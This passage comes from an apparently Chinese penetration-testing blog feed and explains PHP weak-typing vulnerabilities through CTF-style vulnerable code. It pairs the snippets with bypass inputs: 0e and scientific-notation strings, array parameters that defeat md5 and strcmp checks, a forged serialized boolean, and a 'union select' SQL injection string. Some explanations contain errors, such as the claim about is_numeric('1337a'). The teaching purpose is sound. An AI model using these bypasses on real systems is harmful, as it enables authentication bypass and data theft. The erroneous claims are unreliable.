src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310221503.png" alt></p><ul><li><p>当<strong>不同类型的变量进行比较的时候就会存在<code>变量转换</code>的问题</strong>，在转换之后就有可能会存在问题。</p></li><li><p><strong>当一个字符串当作一个数值来取值</strong>，其结果和类型如下:</p><ul><li>如果该字符串没有包含<code>.</code>，<code>e</code>，<code>E</code>并且其数值值在<code>整型</code>的范围之内，该字符串被当作<code>int</code>来取值，其他所有情况下都被作为<code>float</code>来取值，该<strong>字符串的<code>开始部分</code>决定了它的值</strong></li><li>如果该字符串以合法的数值开始，则使用该数值，否则其值为0<br><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310221523.png" alt></li></ul></li><li><p>这里需要注意一下，第二个条件是<code>===</code>，和<code>==</code>是有点区别的：</p><ul><li><code>===</code>是恒等计算符 同时检查表达式的值与类型,可以理解为<strong>先检查类型再检查值</strong></li><li><code>==</code>是比较运算符号 不会检查条件式的表达式的类型,<strong>如果类型不同的进行比较，其会将类型转换成相同的再进行比较</strong></li></ul></li></ul><h5 id="Hash比较"><a href="#Hash比较" class="headerlink" title="Hash比较"></a>Hash比较</h5><blockquote><p>kali中输入如下代码验证：<code>php -r &#39;var_dump(&quot;00e0345&quot; == &quot;0&quot;);&#39;</code><br><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20190310221542.png" alt></p></blockquote><ul><li>除了以上的这种方式之外在进行hash比较的时候也会存在问题。php在处理hash字符串的时候会用到<code>!=</code>,<code>==</code>来进行hash比较，<strong>如果hash值以<code>0e</code>开头，后边都是<code>数字</code>，再与数字比较，就会被解释成    <code>科学记数法</code>:<code>0*10^n</code>还是为<code>0</code>，就会被判断相等</strong>,如下：</li></ul><pre><code>&quot;0e132456789&quot;==&quot;0e7124511451155&quot; // true&quot;0e123456abc&quot;==&quot;0e1dddada&quot;           // false&quot;0e1234abc&quot;==&quot;0&quot;                       // false</code></pre><ul><li>当全是数字的时候，宽松的比较会执行<strong>尽力模式</strong>，如<code>0e12345678</code>会被解释成<code>0*10^12345678</code>, <strong>除了<code>e</code>外不全是数字的时候就不会相等</strong></li></ul><h6 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h6><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'flag{test}'</span><span class="token punctuation">;</span><span class="token keyword">if</span>  <span class="token punctuation">(</span><span class="token string">"POST"</span> <span class="token operator">==</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_METHOD'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">>=</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[[:graph:]]{12,}$/'</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'Wrong Format'</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token constant">TRUE</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">></span> <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span>             <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$ps</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'punct'</span><span class="token punctuation">,</span> <span class="token string">'digit'</span><span class="token punctuation">,</span> <span class="token string">'upper'</span><span class="token punctuation">,</span> <span class="token string">'lower'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ps</span> <span class="token keyword">as</span> <span class="token variable">$pt</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[[:$pt:]]+/"</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                 <span class="token variable">$c</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$c</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"42"</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string">'Wrong password'</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><ul><li>这里的意思就是：接收post参数password的值，必须满足12位以上字符，必须是非空格非TAB之外的内容，然后就是你的password要有大小写数字，字符内容，而且匹配到的次数要大于6次，最后才是这里的考点：</li></ul><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"42"</span> <span class="token operator">==</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span> <span class="token keyword">else</span> <span class="token keyword">echo</span> <span class="token string">'Wrong password'</span><span class="token punctuation">;</span></code></pre><ul><li>最后的答案就是：<code>42.00e+00000000000</code> , 当然也可以这样：<code>420.000000000e-1</code></li><li>42.00e+0000000000，10的00000次方。。等于42.000000…. 结果其实就是42</li></ul><h5 id="十六进制转换"><a href="#十六进制转换" class="headerlink" title="十六进制转换"></a>十六进制转换</h5><ul><li>还存在一种十六进制余字符串进行比较运算时的问题。例子如下：</li></ul><pre><code>&quot;0x1e240&quot;==&quot;123456&quot;        // true&quot;0x1e240&quot;==123456           // true&quot;0x1e240&quot;==&quot;1e240&quot;        // false</code></pre><ul><li>当其中的一个字符串是<code>0x</code>开头的时候，PHP会<strong>将此字符串解析成为<code>十进制</code>然后再进行比较</strong>，<code>0x1240</code>解析成为十进制就是<code>123456</code>，所以与<strong>int类型和string类型的123456比较都是相等</strong>。</li></ul><h4 id="类型转换-1"><a href="#类型转换-1" class="headerlink" title="类型转换"></a>类型转换</h4><p>常见的转换主要就是<code>int转换为string</code>，<code>string转换为int</code>。</p><h5 id="int转string："><a href="#int转string：" class="headerlink" title="int转string："></a>int转string：</h5><pre><code>$var = 5;方式1：$item = (string)$var;方式2：$item = strval($var);</code></pre><h5 id="string转int：intval-函数。"><a href="#string转int：intval-函数。" class="headerlink" title="string转int：intval()函数。"></a>string转int：<code>intval()</code>函数。</h5><ul><li>对于这个函数，可以先看2个例子。</li></ul><pre class=" language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//2</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'3abcd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//3</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//0</span></code></pre><ul><li>说明<code>intval()</code>转换的时候，会将<strong>从字符串的开始进行转换直到遇到一个<code>非数字</code>的字符</strong>。即使出现无法转换的字符串，<code>intval()</code>不会报错而是<strong>返回0</strong>。</li><li>同时，程序员在编程的时候也不应该使用如下的这段代码：</li></ul><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">1000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string">"select * from news where id="</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>这个时候<code>$a</code>的值有可能是<code>1002 union…..</code></p><h6 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h6><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"flag{test}"</span><span class="token punctuation">;</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token string">"1337a"</span><span class="token punctuation">;</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"nope"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token operator">></span><span class="token number">1336</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre><ul><li>代码中先将变量放到<code>is_numeric</code>函数中判断，如果数字或数字字符串则返回true，否咋返回false。然后一个判断，如果temp大于1336则显示flag。这里用到了PHP弱类型的一个特性，<strong>当一个整型和一个其他类型行比较的时候，会先把其他类型<code>intval</code>再比</strong>。如果输入一个<code>1337a</code>这样的字符串，在is_numeric中返回true，然后在比较时被转换成数字1337，这样就绕过判断输出flag。</li></ul><h4 id="bool欺骗"><a href="#bool欺骗" class="headerlink" title="bool欺骗"></a>bool欺骗</h4><blockquote><p>当存在<code>json_decode</code>和<code>unserialize</code>的时候，部分结构会被解释成<code>bool类型</code>，也会造成欺骗。</p></blockquote><h5 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a><code>json_decode</code></h5><pre class=" language-php"><code class="language-php"><span class="token variable">$json_str</span> <span class="token operator">=</span> <span class="token string">'{"user":true,"pass":true}'</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json_str</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'secirity'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token string">'logined in as bool'</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行结果：</p><pre><code>root@kali:/var/www# php /root/php/hash.phplogined in as bool</code></pre><h5 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a><code>unserialize</code></h5><pre class=" language-php"><code class="language-php"><span class="token variable">$unserialize_str</span> <span class="token operator">=</span> <span class="token string">'a:2:{s:4:"user";b:1;s:4:"pass";b:1;}'</span><span class="token punctuation">;</span><span class="token variable">$data_unserialize</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$unserialize_str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$data_unserialize</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'secirity'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token string">'logined in unserialize'</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行结果如下：</p><pre><code>root@kali:/var/www# php /root/php/hash.phplogined in unserialize</code></pre><p><strong>bool类型的true跟任意字符串可以弱类型相等</strong>。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（<code>a</code>代表<code>array</code>，<code>s</code>代表<code>string</code>，<code>b</code>代表<code>bool</code>，而<code>数字</code>代表个数/长度）</p><h4 id="数字转换欺骗"><a href="#数字转换欺骗" class="headerlink" title="数字转换欺骗"></a>数字转换欺骗</h4><pre class=" language-php"><code class="language-php"><span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$user_id</span> <span class="token operator">==</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$user_id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">#$user_id = intval($user_id);</span>    <span class="token variable">$qry</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM `users` WHERE user_id='$user_id';"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$qry</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'&lt;pre>'</span> <span class="token punctuation">.</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_fetch_row</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>将<code>user_id=0.999999999999999999999</code>发送出去得到结果如下：</p><pre><code>Array(    [0] =&gt; 0    [1] =&gt; lxx&#39;    [2] =&gt;     [3] =&gt;     [4] =&gt;     [5] =&gt; )</code></pre><p>本来是要查询user_id的数据，结果却是<code>user_id=0</code>的数据。<strong><code>int</code>和<code>intval</code>在转换数字的时候都是<code>就低</code>的</strong>，再如下代码:</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM user WHERE uid=%d"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">mail</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Cannot reset password of admin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>假如传入<code>1.1</code>，就绕过了<code>$_POST[&#39;uid&#39;]！=1</code>的判断，就能对<code>uid=1</code>的用户进行操作了。另外<code>intval</code>还有个<strong>尽力模式</strong>，就是<strong>转换所有数字直到遇到非数字为止</strong>，如果采用:</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$qq</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"select * from user where qq = $qq"</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>攻击者传入<code>123456 union select version()</code>进行攻击。</p><h3 id="内置函数的参数的松散性"><a href="#内置函数的参数的松散性" class="headerlink" title="内置函数的参数的松散性"></a>内置函数的参数的松散性</h3><p><code>内置函数的松散性</code>说的是，<strong>调用函数时给函数传递函数无法接受的参数类型</strong>。解释起来有点拗口，还是直接通过实际的例子来说明问题，下面会重点介绍几个这种函数。</p><h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><pre class=" language-php"><code class="language-php"><span class="token variable">$array1</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">"foo"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"bar"</span><span class="token punctuation">,</span>    <span class="token string">"bar"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"foo"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token string">"bar"</span><span class="token punctuation">,</span> <span class="token string">"hello"</span><span class="token punctuation">,</span> <span class="token string">"world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$array2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//true</span></code></pre><p>PHP手册中的<code>md5()</code>函数的描述是<code>string md5 ( string $str [, bool $raw_output = false ] )</code>，<code>md5()</code>中的需要是一个<code>string</code>类型的参数。但是当你传递一个<code>array</code>时，<code>md5()</code>不会报错，只是会无法正确地求出array的md5值，md5的结果都是<code>null</code>这样就<strong>会导致任意2个array的md5值都会相等</strong>。</p><h5 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h5><p>注意以下代码,需要判断username和password的md5运算相等才会显示flag</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'flag{test}'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'Your password can not be your username.'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">print</span> <span class="token string">'Invalid password'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>这时候给<code>username</code>和<code>passwor</code>d传入<code>数组</code>,即可拿到flag</p><pre><code>http://www.example.com/index.php?username[]=1&amp;password[]=2</code></pre><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><p><code>strcmp()</code>函数在PHP官方手册中的描述是<code>int strcmp ( string $str1 , string $str2 )</code>,需要给<code>strcmp()</code>传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的<code>本质</code>是<strong>将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值</strong>。<br>如果传入给出<code>strcmp()</code>的参数是<code>数组</code>呢？</p><pre class=" language-php"><code class="language-php"><span class="token variable">$array</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span><span class="token string">'123'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//结果是null</span></code></pre><p>在某种意义上<code>null</code>也就是相当于<code>false</code></p><h5 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">else</span>          <span class="token keyword">print</span> <span class="token string">'Invalid password'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>使用<code>strcmp</code>去比较password和flag，如果<code>==0</code>的话，就给出flag，但是<code>strcmp</code>比较，<strong>只有相等才会返回0，如果不相等的 话，要么大于0，要么小于0</strong>，但是strcmp只会处理字符串参数，如果<strong>给个数组的话呢，就会返回NULL,而判断使用的是<code>==</code>，<code>NULL==0</code>是 <code>bool(true)</code>的</strong></p><h4 id="switch"><a href="#switch" class="headerlink" title="switch()"></a>switch()</h4><ul><li><strong>如果switch是数字类型的case的判断时，switch会将其中的参数转换为int类型</strong>。如下：</li></ul><pre class=" language-php"><code class="language-php"><span class="token variable">$i</span> <span class="token operator">=</span><span class="token string">"2abc"</span><span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>    <span class="token keyword">echo</span> <span class="token string">"i is less than 3 but not negative"</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>    <span class="token keyword">echo</span> <span class="token string">"i is 3"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这个时候程序输出的是<code>i is less than 3 but not negative</code>，是由于<code>switch()</code>函数将<code>$i</code>进行了类型转换，转换结果为<code>2</code>。</p><h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h4><p>在PHP手册中，<code>in_array()</code>函数的解释是<code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code>,如果<code>strict</code>参数没有提供，那么in_array就会使用松散比较来判断<code>$needle</code>是否在<code>$haystack</code>中。当strince的值为true时，<code>in_array()</code>会比较<code>needle</code>的类型和<code>haystack</code>中的<strong>类型是否相同</strong>。</p><pre><code>in_array — 检查数组中是否存在某个值 参数needle 待搜索的值。注意: 如果 needle 是字符串，则比较是区分大小写的。haystack 这个数组。strict 如果第三个参数 strict 的值为 TRUE 则 in_array() 函数还会检查 needle 的类型是否和 haystack 中的相同。可以看到，只有加了strict才会对类型进行严格比较</code></pre><pre class=" language-php"><code class="language-php"><span class="token variable">$array</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//true</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token string">'1bc'</span><span class="token punctuation">,</span> <span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//true</span><span class="token comment" spellcheck="true">// 它遍历了array的每个值，并且作"=="比较（“当设置了strict 用===”）</span></code></pre><p>可以看到上面的情况返回的都是true,<strong>因为’abc’会转换为0(<code>intval(&#39;abc&#39;)=0</code>)，’1bc’转换为1(<code>intval(&#39;1bc&#39;)=1</code>)</strong>。<br><code>array_search()</code>与<code>in_array()</code>也是一样的问题。</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/_1527742998_24616_1536892885" alt></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php弱类型 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web源码泄露总结</title>
      <link href="/2019/03/11/web-yuan-ma-xie-lu-zong-jie/"/>
      <url>/2019/03/11/web-yuan-ma-xie-lu-zong-jie/</url>
      
